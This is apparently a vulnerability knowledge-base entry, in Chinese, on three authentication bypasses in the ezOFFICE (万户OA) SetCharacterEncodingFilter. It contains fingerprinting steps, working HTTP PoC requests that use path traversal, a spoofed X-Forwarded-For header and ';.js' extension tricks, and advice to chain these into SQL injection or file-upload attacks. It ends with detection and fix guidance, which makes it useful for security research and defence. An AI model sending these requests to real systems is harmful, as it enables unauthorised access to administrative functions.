---
id: web-generic-auth-whir-ezoffice-characterencoding-filter-bypass
title: 万户OA SetCharacterEncodingFilter 三种鉴权绕过：特征路径穿越、XFF 白名单与扩展名解析
type: scenario
domain: web
path: web/generic/auth
technique: whir-ezoffice-characterencoding-filter-bypass
aliases:
- 万户OA 鉴权绕过
- ezOFFICE SetCharacterEncodingFilter
- iWebOfficeSign/OfficeServer.jsp 绕过
- xfservices/GeneralWeb XFF 绕过
- admin.jsp;.js 绕过
- whir_new_verifyCode
tags:
- web
- auth
- auth-bypass
- java
- oa
- whir
- ezoffice
- filter
- path-traversal
- xff
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:17+08:00'
  notes: 已对照原文与 img03-22 核对：SetCharacterEncodingFilter 三种绕过（iWebOfficeSign 特征子串+../、xfservices/GeneralWeb+XFF 白名单+haveXXE、admin.jsp;.js 扩展名解析）与原代码一致；修正 XFF 判断细节：仅 localhost 这类数字少于 3 个的白名单项按前缀匹配，数字型 IP 需精确相等。原文未展示三种绕过的实际响应截图，未复跑。
---

## 一句话结论

万户OA（ezOFFICE）的 `com.whir.common.util.SetCharacterEncodingFilter` 同时承担编码与登录鉴权，存在三类绕过：命中 `/iWebOfficeSign/OfficeServer.jsp` 特征子串即提前放行（配合 `../` 归一化）、命中 `/xfservices/GeneralWeb` 或 `/services/ExchangeService` 时用可伪造的 `X-Forwarded-For` 过 IP 白名单、以及按最后一个 `.` 取后缀导致 `.jsp;.js` 被当成非 JSP 而跳过鉴权；未登录即可访问后台 JSP/Action。

## 原理

- `web.xml` 把 `SetCharacterEncodingFilter` 映射到全局，`doFilter` 的关键逻辑：
  - `string3 = request.getRequestURI()`，`string4 = request.getContextPath()`，`string5 = string3.substring(string4.length())`（去掉上下文路径后的请求路径）；
  - **绕法一**：`if (string5.indexOf("/iWebOfficeSign/OfficeServer.jsp") >= 0) { filterChain.doFilter(...); return; }`。这是用于 iWebOffice 签名的公开路径，只做子串匹配；请求 `/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../admin/info` 既包含该子串，又会被容器归一化为 `/admin/info`。
  - **绕法二**：`if (string5.indexOf("/xfservices/GeneralWeb") >= 0 || string5.indexOf("/services/ExchangeService") >= 0)` 时，先 `judgeIsSecurityIP`，再检查 `MAPIHttpServletRequestWrapper.haveXXE()`，都通过才放行。IP 白名单来自 `config/whconfig.xml` 的 `servicelist/address/ip`（含 `localhost`），而 `IPUtil.getIpAddr` 依次取 `X-Forwarded-For`、`Proxy-Client-IP`、`WL-Proxy-Client-IP`、`RemoteAddr`，前三个均可伪造；`haveXXE` 只检查 body 是否含 `<!DOCTYPE`/`&lt;!DOCTYPE`，不带 DOCTYPE 即可通过。构造成 `/xfservices/GeneralWeb../../admin/info` 并加 `X-Forwarded-For: localhost` 即可绕过。
  - **绕法三**：`string10` 取 `string5.substring(string5.lastIndexOf("."))`，只有 `string10` 为空、`.jsp`、`.vm` 时才进入 session 鉴权；请求 `/admin.jsp;.js` 的 `string10` 是 `.js`，不满足条件，直接跳过登录检查（`.jspx` 会被重定向登录，可用 `.jspx;.js` 绕过）。此外 `/evo/weixin/`、`/portal/`、`/upgrade/`、`/public/edit/` 等前缀在白名单中，可用 `/evo/weixin/../../admin.jsp` 走白名单。
  - 后续 referer 分支即使判断出无 referer，也因 `if (!securityList.getPageWhiteList().contains(string5)) { }` 为空代码块而继续 `filterChain.doFilter`；传 `whir_new_verifyCode=1` 可跳过对应的重定向分支。
- 根因：过滤器把“公开资源特征”和“扩展名”当作安全边界，但请求路径在过滤器阶段仍是原始未归一化字符串，且 IP 来自可伪造头；安全判断与实际路由解析使用了不同的字符串。

## 触发条件

- 目标为万户OA/ezOFFICE，`SetCharacterEncodingFilter` 按上述逻辑启用（`needSecurity=true`）。
- `/iWebOfficeSign/OfficeServer.jsp` 存在于应用或仅作为路径特征（不需真实文件）。
- 或 `whconfig.xml` 的 servicelist 含 `localhost`/可伪造前缀，攻击者能控制 `X-Forwarded-For`。
- 或目标 JSP/容器接受 `;` 路径参数、`/../` 归一化（Tomcat 常见）。

## 利用步骤

1. 用指纹 `defaultroot/scripts/main/whir.util.js` 确认目标为万户OA。
2. 任选一种绕法访问一个需要登录的后台路径（如 `/admin/info`、`/defaultroot/...`），观察是否返回业务内容而非登录页：
   - `/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../admin/info`
   - `/xfservices/GeneralWeb../../admin/info` + `X-Forwarded-For: localhost`
   - `/admin.jsp;.js`
   - `/evo/weixin/../../admin.jsp`
3. 用返回内容/状态码确认鉴权已绕过；再结合 SQL 注入、文件上传/下载等 sink 发起请求。
4. 记录原始请求、响应与绕过的判断依据。

## PoC

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../admin/info HTTP/1.1
Host: target
```

```http
GET /xfservices/GeneralWeb../../admin/info HTTP/1.1
Host: target
X-Forwarded-For: localhost
```

```http
GET /admin.jsp;.js HTTP/1.1
Host: target
```

```http
GET /evo/weixin/../../admin.jsp HTTP/1.1
Host: target
```

原文通过代码审计给出以上三种绕过路径；未展示每种绕过的实际响应截图。

## 变体与关联

- 变体：`.jspx` 被显式重定向登录，可尝试 `.jspx;.js`、`.jspx/.`、大小写/分号变体；PATH_INFO、`%2e%2e`、`..;/` 等容器归一化差异也可测试。
- 变体：XFF 头可换成 `Proxy-Client-IP`/`WL-Proxy-Client-IP`；`judgeIsSecurityIP` 对含 3 个以上数字的白名单项（如 `192.168.7.137`）做精确相等比较，对 `localhost` 这类数字不足 3 个的值才按前缀匹配，因此白名单含 `localhost` 时 XFF 可直接填 `localhost`（含数字型 IP 白名单则需知道具体 IP）。
- 关联：本绕过是后续 [[web-generic-sqli-whir-ezoffice-jsp-concat-three]]、[[web-generic-file-upload-whir-ezoffice-fileupload-action-extension]]、[[web-generic-file-inclusion-whir-ezoffice-down-jsp-download-ftp]]、[[web-generic-xxe-whir-ezoffice-weixin-callback-xmlparse]] 等 sink 的未授权入口。
- 边界：补丁会改为归一化后比较/精确匹配、移除特征子串放行、改用真实连接 IP；若部署在会先归一化路径的反向代理之后，部分路径绕过可能失效。

## 检测与防御

- 检测：请求路径同时包含 `iWebOfficeSign/OfficeServer.jsp` 与 `../`；`/xfservices/GeneralWeb` 或 `/services/ExchangeService` 携带非内网 `X-Forwarded-For`；URL 出现 `;`、`.js` 结尾的 `.jsp` 路径；同一 IP 多次尝试登录页/后台路径混合访问。
- 修复：鉴权前对 path 做规范化与解码，按归一化后的最终路由做精确匹配；公开路径使用白名单精确匹配而非子串；IP 白名单取连接层真实地址，不信任 XFF；扩展名从规范化路径提取并大小写/分号处理；把编码过滤器与鉴权过滤器拆分。
- 加固：在反向代理层拒绝含 `..`、`;`、双重编码的路径；对 `/iWebOfficeSign/` 等公开路径限制 HTTP 方法与参数；统一在网关做鉴权。
